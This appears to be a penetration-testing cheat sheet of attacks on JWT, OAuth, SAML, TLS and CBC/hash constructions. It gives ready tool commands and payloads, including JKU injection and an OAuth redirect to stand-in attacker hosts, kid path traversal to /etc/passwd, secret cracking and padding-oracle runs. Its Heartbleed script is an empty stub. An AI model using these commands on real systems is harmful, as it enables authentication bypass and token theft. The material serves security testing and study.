# Cryptographic Attacks — JWT, OAuth, SAML, TLS
## Last Updated: Mon Jul 06 2026

## ==========================================
## JWT ATTACKS
## ==========================================

### Tool: jwt_tool
pip3 install jwt_tool
# Or: https://github.com/ticarpi/jwt_tool

### 1. None Algorithm Attack
jwt_tool <token> -X a
# Change alg from "RS256" to "none" or "None" or "NONE"

### 2. Algorithm Confusion (RS256 → HS256)
# If server uses RS256 (asymmetric), force HS256 (symmetric)
# Use public key as HMAC secret
jwt_tool <token> -X k -pk public.pem

### 3. Weak HMAC Secret
hashcat -m 16500 jwt.txt rockyou.txt
# Or: john jwt.txt --wordlist=rockyou.txt

### 4. Kid Injection (Path Traversal)
{"kid":"../../../../dev/null"}  → alg=none → bypass verification
{"kid":"../../../../etc/passwd"}  → use file contents as secret
{"kid":"file:///etc/passwd"}

### 5. JWK Injection (CVE-2018-0114)
# Inject our own JWK key into token header
jwt_tool <token> -X i -I "jwk: {kty:'RSA', n:'...', e:'...'}"

### 6. JKU Injection
# Point to attacker-controlled JWKS URL
jwt_tool <token> -X i -I "jku: https://attacker.com/jwks.json"

### 7. CVE-2026-22817, CVE-2026-27804, CVE-2026-23552
# New 2026 JWT algorithm confusion CVEs
# Various library-specific bypasses

## ==========================================
## OAUTH 2.0 ATTACKS
## ==========================================

### 1. Redirect URI Manipulation
# Register app with attacker-controlled redirect URI
# Or use open redirect on target domain
https://target.com/auth?client_id=xxx&redirect_uri=https://evil.com/callback

### 2. CSRF on OAuth Flow
# Steal authorization code via CSRF
# No "state" parameter = vulnerable

### 3. Authorization Code Interception
# If redirect_uri is too permissive (https://*.target.com/*)
# Attacker registers subdomain that catches the code

### 4. Scope Escalation
# Request higher privilege scope during token exchange
# https://target.com/auth?scope=read+write+admin

### 5. Token Exchange Confusion
# Exchange auth code for token at wrong endpoint
# Mix authorization code flow with implicit flow

### 6. PKCE Downgrade
# If PKCE not enforced by server
# Remove code_challenge parameter
# Auth code can be intercepted and exchanged

### 7. Refresh Token Harvesting
# Steal refresh token → long-term access
# Refresh tokens often have no rotation

## ==========================================
## SAML ATTACKS
## ==========================================

### SAMLStorm (CVE-2025-26784) — Node.js xml-crypto
# Forge SAML authentication responses
# Bypass signature verification in xml-crypto library
# Impact: Full account takeover

### 1. XML Signature Wrapping
# Manipulate XML structure while keeping signature valid
# Insert malicious Assertion alongside valid one

### 2. SAML Response Forgery
# If SignatureValidation is disabled or misconfigured
# Create arbitrary SAML response

### 3. Comment Injection
# Insert XML comments to bypass signature validation
# <saml:Assertion ID="..."><!-- -->...</saml:Assertion>

### 4. IDP Confusion
# If SP trusts multiple IDPs
# Attacker registers own IDP and forges auth

### 5. Replay Attack
# Reuse captured SAML response
# If no OneTimeUse or NotOnOrAfter check

## ==========================================
## TLS / SSL ATTACKS
## ==========================================

### 1. TLS Version Downgrade
# Force downgrade to TLS 1.0/1.1
# Exploit POODLE, BEAST, etc.

### 2. Certificate Misconfiguration
# Weak key (RSA < 2048)
# Expired certificate
# Wildcard certificate misuse
# Missing revocation checking

### 3. STARTTLS Injection
# Plaintext command injection before TLS handshake
# SMTP, IMAP, FTP STARTTLS

### 4. CRIME/BREACH (Compression Side-Channel)
# TLS compression leaks secrets
# Attacker injects known text and observes compression ratio

### 5. Heartbleed (CVE-2014-0160) — still relevant for legacy
# Read server memory via heartbeat extension
python3 -c "
import socket
# Heartbleed exploit script
# Read 64KB of server memory
"

## ==========================================
## PADDING ORACLE ATTACK
## ==========================================

### Tool: padbuster, padre
# Exploit CBC mode padding validation
# Decrypt ciphertext without key

### CBC Padding Oracle:
# If server returns "invalid padding" vs "invalid MAC"
# Attacker can decrypt blocks byte-by-byte

### Command:
padbuster http://target/api/encrypted_data "encrypted_base64" 8 -cookies "session=xxx"

## ==========================================
## HASH EXTENSION ATTACK
## ==========================================

### Tool: hash_extender
# If: secret + message → MD5/SHA1 hash
# Attacker can: append data and compute new valid hash

### Command:
hash_extender -d "original_data" -s "original_hash" -a "&admin=1" -f md5 -l <secret_length>

